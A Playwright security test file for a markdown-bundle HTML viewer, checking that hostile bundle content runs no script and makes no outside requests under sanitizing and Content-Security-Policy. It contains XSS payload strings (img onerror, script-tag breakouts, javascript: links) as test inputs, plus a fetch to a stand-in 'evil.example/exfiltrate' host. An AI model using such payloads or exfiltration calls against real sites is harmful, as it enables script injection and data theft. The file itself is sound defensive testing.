// SPEC §6: no text from a bundle is interpreted as HTML or script, and a
// viewer's only requests are for its two libraries.

import { expect, type Page } from "@playwright/test";
import { buildGraph } from "../../src/core/graph.js";
import { renderViewer } from "../../src/core/html.js";
import { UNSAFE_ASSETS } from "../../src/generated/assets.unsafe.js";
import { generateViewer } from "../../src/index.js";
import { LIBRARY_URLS, openViewer, test, type Via } from "./harness.js";
import { hostileBundle } from "./hostile.js";

/** Records every call a payload manages to make, and every dialog. */
async function watchForScript(page: Page): Promise<string[]> {
  const ran: string[] = [];
  await page.exposeFunction("__pwned", (tag: string) => {
    ran.push(tag);
  });
  page.on("dialog", async (dialog) => {
    ran.push(`dialog: ${dialog.message()}`);
    await dialog.dismiss();
  });
  return ran;
}

/** Shows every concept in turn, so that every body and field is rendered. */
async function visitEveryConcept(page: Page): Promise<number> {
  await expect(page.locator("#bundle-name")).not.toBeEmpty();
  const ids: string[] = await page.evaluate(() =>
    (window as any).okfViewer.cy.nodes().map((n: any) => n.data("concept")),
  );
  for (const id of ids) {
    await page.evaluate((conceptId) => (window as any).okfViewer.showDetail(conceptId), id);
    await expect(page.locator("#detail-id")).toHaveText(id);
    // Give anything that was going to load or run the time to do it.
    await page.evaluate(() => new Promise((resolve) => requestAnimationFrame(() => resolve(null))));
  }
  return ids.length;
}

for (const via of ["file", "http"] as Via[]) {
  test.describe(`a hostile bundle, opened by ${via}`, () => {
    // T4
    test("runs no script and requests nothing but the two libraries", async ({ page }) => {
      const ran = await watchForScript(page);
      const files = hostileBundle({ metaRefresh: true });
      const { html, stats } = generateViewer({
        name: "<img src=x onerror=\"__pwned('name')\">",
        files,
      });
      const opened = await openViewer(page, html, { via });
      try {
        expect(await visitEveryConcept(page)).toBe(stats.concepts);
        expect(stats.concepts).toBe(7);

        // Everything a body holds is markdown's own, and goes nowhere it may not.
        await page.evaluate(() => (window as any).okfViewer.showDetail("hostile"));
        const detail = page.locator("#detail");
        await expect(
          detail.locator("script, iframe, object, style, link, video, base, form, svg, meta"),
        ).toHaveCount(0);
        await expect(detail.locator("img")).toHaveCount(0);
        const hrefs = await detail
          .locator("a[href]")
          .evaluateAll((links) => links.map((a) => a.getAttribute("href") as string));
        expect(hrefs.length).toBeGreaterThan(0);
        for (const href of hrefs) expect(href === "#" || href.startsWith("https://")).toBe(true);
        const handlers = await detail
          .locator("*")
          .evaluateAll((nodes) =>
            nodes.flatMap((node) =>
              node.getAttributeNames().filter((name) => name.startsWith("on")),
            ),
          );
        expect(handlers).toEqual([]);

        // The markup is there to read, as text.
        await expect(page.locator("#detail-body")).toContainText(
          "<script>__pwned('body-script')</script>",
        );
        await expect(page.locator("#detail-title")).toContainText("</script><script>");
        await expect(page.locator("#bundle-name")).toHaveText(
          "<img src=x onerror=\"__pwned('name')\">",
        );

        // The real link still works, and so do the concepts named after
        // properties of Object.prototype.
        await page.locator("#detail-body a.internal", { hasText: "real link" }).click();
        await expect(page.locator("#detail-id")).toHaveText("benign");
        await page.evaluate(() => (window as any).okfViewer.showDetail("__proto__"));
        await expect(page.locator("#detail-type")).toHaveText("__proto__");
        await page.locator("#detail-body a.internal", { hasText: "constructor" }).click();
        await expect(page.locator("#detail-title")).toHaveText("toString");
        await expect(page.locator("#backlinks-list li")).toHaveText(["__proto__ (__proto__)"]);
        await page.locator("#filter-type").selectOption("__proto__");
        await page.locator("#search").fill("constructor");

        // Reports of violations arrive after the fact: wait for any on the way.
        await page.evaluate(() => new Promise((resolve) => setTimeout(resolve, 300)));
        expect(ran).toEqual([]);
        expect(opened.violations).toEqual([]);
        expect(opened.errors).toEqual([]);
        expect(opened.requests.sort()).toEqual([...LIBRARY_URLS].sort());
        expect(opened.sent.sort()).toEqual([...LIBRARY_URLS].sort());
        expect(page.url()).toBe(opened.url);
      } finally {
        await opened.close();
      }
    });

    // T5
    test("is still stopped by the Content-Security-Policy with sanitizing switched off", async ({
      page,
    }) => {
      const ran = await watchForScript(page);
      // Without the meta refresh: a policy can't stop a page from navigating,
      // only from running and loading. SPEC §6 says so.
      const files = hostileBundle({ metaRefresh: false });
      const html = renderViewer(
        { name: "Hostile", assetBase: "", graph: buildGraph(files) },
        "cdn",
        UNSAFE_ASSETS,
      );
      const opened = await openViewer(page, html, { via });
      try {
        await visitEveryConcept(page);

        // The markup really is on the page this time.
        await page.evaluate(() => (window as any).okfViewer.showDetail("hostile"));
        const body = page.locator("#detail-body");
        await expect(body.locator("img").first()).toBeAttached();
        await expect(body.locator("iframe")).toHaveCount(1);

        // Following a javascript: link is running script, and is refused.
        // The click is dispatched because the page has no layout to speak of.
        for (const link of await body.locator('a[href^="javascript:"]').all()) {
          await link.dispatchEvent("click");
        }
        await body.locator("form button").dispatchEvent("click");
        await page.evaluate(() => new Promise((resolve) => setTimeout(resolve, 300)));

        expect(ran).toEqual([]);
        expect(opened.violations.length).toBeGreaterThan(5);
        const blocked = new Set(opened.violations.map((violation) => violation.split(" ")[0]));
        for (const directive of [
          "script-src-attr",
          "script-src-elem",
          "img-src",
          "frame-src",
          "style-src-elem",
        ]) {
          expect(blocked, directive).toContain(directive);
        }
        // Nothing left the page for another origin. A browser may report a
        // request it then refused, so this counts what reached the network;
        // the page's own origin is where the policy lets an image come from.
        const origin = new URL(opened.url).origin;
        const elsewhere = opened.sent.filter((request) => new URL(request).origin !== origin);
        expect(elsewhere.sort()).toEqual([...LIBRARY_URLS].sort());
        expect(page.url()).toBe(opened.url);
      } finally {
        await opened.close();
      }
    });
  });
}

test("the policy is in force before the libraries are requested", async ({ page }) => {
  const { html } = generateViewer({ name: "N", files: { "a.md": "x" } });
  const opened = await openViewer(page, html, { via: "http" });
  const allowed = await page.evaluate(async () => {
    try {
      await fetch("https://evil.example/exfiltrate", { mode: "no-cors" });
      return true;
    } catch {
      return false;
    }
  });
  expect(allowed).toBe(false);
  await expect
    .poll(() => opened.violations.some((violation) => violation.startsWith("connect-src")))
    .toBe(true);
  expect(opened.requests.sort()).toEqual([...LIBRARY_URLS].sort());
  await opened.close();
});
